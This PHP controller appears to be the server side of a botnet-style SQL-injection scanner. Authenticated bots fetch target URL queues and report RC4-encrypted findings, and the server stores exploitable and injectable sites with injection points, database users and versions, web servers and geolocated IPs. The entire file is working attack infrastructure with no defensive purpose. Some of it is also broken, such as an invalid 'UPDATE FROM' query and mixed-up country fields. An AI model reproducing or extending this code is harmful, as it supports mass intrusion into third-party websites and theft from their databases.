<?php
class SqliController extends Controller
{
    function get_urls_queue() {
        $this->isAuthBot();
        $r = array(
            'success' => true
        );
        $max = 500;
        if (isset($_GET['max']) && is_numeric($_GET['max'])) {
            $max = intval($_GET['max']);
        }
        
        $urls = $this->db->select('*')->get('url_queues')->where('status', 0)->limit($max)->result();

        $ids = array();
        foreach ($urls as $k => $v) {
            $ids[] = $v->id;
        }
        if (!empty($ids)) {
            $this->db->query("UPDATE FROM urls SET status=1 WHERE id in (" . implode(',', $ids) . ")");
        }

        $r['urls_queue'] = $urls;
        $r['count'] = count($urls);

        $this->set($r);
    }

    function get_urls() {
        $this->isAuthBot();
        $r = array(
            'success' => true
        );
        $max = 500;
        if (isset($_GET['max']) && is_numeric($_GET['max'])) {
            $max = intval($_GET['max']);
        }
        
        $urls = $this->db->select('id,url')->limit($max)->get('urls')->result();

        $ids = array();
        foreach ($urls as $k => $v) {
            $ids[] = $v->id;
        }
        if (!empty($ids)) {
            $this->db->query("DELETE FROM urls WHERE id in (" . implode(',', $ids) . ")");
        }

        $total = $this->db->count_all_results('urls');
        if ($total == 0) {
            $this->db->query("TRUNCATE TABLE urls");
        }

        $r['urls'] = $urls;
        $r['count'] = count($urls);

        $this->set($r);
    }

    function get_exploitables() {
        $this->isAuthBot();
        $r = array(
            'success' => true
        );
        $max = 500;
        if (isset($_GET['max']) && is_numeric($_GET['max'])) {
            $max = intval($_GET['max']);
        }
        
        $urls = $this->db->select('id,url,ip,sql_type,country,country_code')->limit($max)->get('url_exploitables')->result();

        $ids = array();
        foreach ($urls as $k => $v) {
            $ids[] = $v->id;
        }
        if (!empty($ids)) {
            $this->db->query("DELETE FROM url_exploitables WHERE id in (" . implode(',', $ids) . ")");
        }

        $total = $this->db->count_all_results('url_exploitables');
        if ($total == 0) {
            $this->db->query("TRUNCATE TABLE url_exploitables");
        }

        $r['exploitables'] = $urls;
        $r['count'] = count($urls);

        $this->set($r);
    }

    function post_urls() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        ignore_user_abort(true);
        set_time_limit(0);

        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);

        $date = date('Y-m-d H:i:s');

        foreach ($data->urls as $k => $v) {
            $this->db->insert('urls', array(
                'url' => $v,
            ));
        }

        $this->db->query("DELETE urls 
                            FROM urls
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM urls 
                                GROUP BY url
                            ) as KeepRows ON
                               urls.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");
        $this->db->query("DELETE urls
                            FROM urls
                            INNER JOIN url_exploitables
                                  ON url_exploitables.url = urls.url");
        $this->db->query("OPTIMIZE TABLE urls");
        $this->status_code = 201;
        $this->set($r);
    }

    function post_exploitables() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        ignore_user_abort(true);
        set_time_limit(0);

        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);

        //$user_id = $this->bot->user_id;
        $date_checked = date('Y-m-d H:i:s');

        $gi = geoip_open(ROOTROOT . DS . 'helpers' . DS . 'GeoIP.dat', GEOIP_STANDARD);
        foreach ($data->exploitables as $k => $v) {

            $v->country = geoip_country_name_by_addr($gi, $v->ip);
            $v->countryCode = empty($v->country ) ? 'Unknown' : $v->country ;
            $v->country = geoip_country_code_by_addr($gi, $v->ip);
            $v->countryCode = empty($v->countryCode ) ? '00' : $v->countryCode ;

            $this->db->insert('url_exploitables', array(
                'url' => $v->url,
                'ip' => $v->ip,
                'sql_type' => $v->sqlType,
                'country' => $v->country,
                'country_code' => $v->countryCode,
                'date_created' => $date_checked,
            ));
        }
        geoip_close($gi);

        $this->db->query("DELETE url_exploitables 
                            FROM url_exploitables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_exploitables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_exploitables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE urls
                            FROM urls
                            INNER JOIN url_exploitables
                                  ON url_exploitables.url = urls.url");
        $this->db->query("OPTIMIZE TABLE url_exploitables");

        $this->status_code = 201;
        $this->set($r);
    }

    function post_injectables() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        ignore_user_abort(true);
        set_time_limit(0);

        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);
        $date_checked = date('Y-m-d H:i:s');

        $gi = geoip_open(ROOTROOT . DS . 'helpers' . DS . 'GeoIP.dat', GEOIP_STANDARD);
        foreach ($data->injectables as $k => $v) {
            $domain = parse_url($v->url, PHP_URL_HOST);

            $v->country = geoip_country_name_by_addr($gi, $v->ip);
            $v->countryCode = geoip_country_code_by_addr($gi, $v->ip);

            $this->db->insert('url_injectables', array(
                'domain' => $domain,
                'url' => $v->url,
                'url_point' => $v->urlPoint,
                'sql_method' => $v->sqlType,
                'sql_user' => $v->user,
                'sql_version' => $v->version,
                'web_server' => $v->webServer,
                'highlights' => $v->highlights,
                'alexa_ranking' => $v->alexaRanking,
                'ip' => $v->ip,
                'country' => $v->country,
                'country_code' => $v->countryCode,
                'date_created' => $date_checked,
                'title' => $v->title,
                'description' => $v->description,
            ));
        }
        geoip_close($gi);

        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_injectables
                                  ON url_injectables.url = url_exploitables.url");
        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, domain 
                                FROM url_injectables 
                                GROUP BY `domain`
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");
        $this->db->query("OPTIMIZE TABLE url_injectables");

        $this->status_code = 201;
        $this->set($r);
    }

    function post_injectable() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);
        $date_checked = date('Y-m-d H:i:s');

        $gi = geoip_open(ROOTROOT . DS . 'helpers' . DS . 'GeoIP.dat', GEOIP_STANDARD);

        $data->si->country = geoip_country_name_by_addr($gi, $data->si->ip);
        $data->si->countryCode = geoip_country_code_by_addr($gi, $data->si->ip);

        $this->db->insert('url_injectables', array(
            'url' => $data->si->url,
            'url_point' => $data->si->urlPoint,
            'sql_method' => $data->si->sqlType,
            'sql_user' => $data->si->user,
            'sql_version' => $data->si->version,
            'web_server' => $data->si->webServer,
            'highlights' => $data->si->highlights,
            'alexa_ranking' => $data->si->alexaRanking,
            'ip' => $data->si->ip,
            'country' => $data->si->country,
            'country_code' => $data->si->countryCode,
            'date_created' => $date_checked,
            'title' => $data->si->title,
            'description' => $data->si->description,
        ));
        geoip_close($gi);

        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_injectables
                                  ON url_injectables.url = url_exploitables.url");
        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, domain 
                                FROM url_injectables 
                                GROUP BY `domain`
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");
        $this->db->query("OPTIMIZE TABLE url_injectables");

        $this->status_code = 201;
        $this->set($r);
    }

    function post_non_injectable() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);
        $date_checked = date('Y-m-d H:i:s');

        $gi = geoip_open(ROOTROOT . DS . 'helpers' . DS . 'GeoIP.dat', GEOIP_STANDARD);

        $this->db->insert('url_non_injectables', array(
            'url' => $data->sni->url,
            'date_created' => $date_checked,
        ));
        geoip_close($gi);

        $this->db->query("DELETE url_non_injectables 
                            FROM url_non_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_non_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_non_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_non_injectables
                                 ON url_non_injectables.url = url_exploitables.url");
        $this->db->query("OPTIMIZE TABLE url_non_injectables");
        $this->status_code = 201;
        $this->set($r);
    }
    function post_non_injectables() {
        $this->isAuthBot();
        $this->Validator->verifyRequiredParams(array('d'));
        $r = array(
            'success' => true
        );
        ignore_user_abort(true);
        set_time_limit(0);

        $data_crypted = $this->app->request->post('d');
        $crypter = new CrypterRC4();
        $json = $crypter->Decrypt($data_crypted, Conf::$encryption_key);
        $data = json_decode($json);

        $date_checked = date('Y-m-d H:i:s');

        $gi = geoip_open(ROOTROOT . DS . 'helpers' . DS . 'GeoIP.dat', GEOIP_STANDARD);
        foreach ($data->non_injectables as $k => $v) {

            $v->country = geoip_country_name_by_addr($gi, $v->ip);
            $v->countryCode = geoip_country_code_by_addr($gi, $v->ip);

            $this->db->insert('url_non_injectables', array(
                'url' => $v->url,
                'date_created' => $date_checked,
            ));
        }
        geoip_close($gi);

        $this->db->query("DELETE url_non_injectables 
                            FROM url_non_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_non_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_non_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");
        $this->db->query("DELETE urls
                            FROM urls
                            INNER JOIN url_non_injectables
                                  ON url_non_injectables.url = urls.url");
        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_non_injectables
                                  ON url_non_injectables.url = url_exploitables.url");

        $this->status_code = 201;
        $this->set($r);
    }

    protected function correction() {
        $this->db->query("DELETE url_exploitables 
                            FROM url_exploitables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_exploitables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_exploitables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE urls
                            FROM urls
                            INNER JOIN url_exploitables
                                  ON url_exploitables.url = urls.url");
        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_injectables
                                  ON url_injectables.url = url_exploitables.url");
        $this->db->query("DELETE url_injectables 
                            FROM url_injectables
                            LEFT OUTER JOIN (
                                SELECT MIN(id) as id, url 
                                FROM url_injectables 
                                GROUP BY url
                            ) as KeepRows ON
                               url_injectables.id = KeepRows.id
                            WHERE
                               KeepRows.id IS NULL");

        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_injectables
                                  ON url_injectables.url = url_exploitables.url");
        $this->db->query("DELETE url_exploitables
                            FROM url_exploitables
                            INNER JOIN url_non_injectables
                                  ON url_non_injectables.url = url_exploitables.url");

        $this->db->query("OPTIMIZE TABLE urls");
        $this->db->query("OPTIMIZE TABLE url_exploitables");
        $this->db->query("OPTIMIZE TABLE url_injectables");
        $this->db->query("OPTIMIZE TABLE url_non_injectables");
    }

}

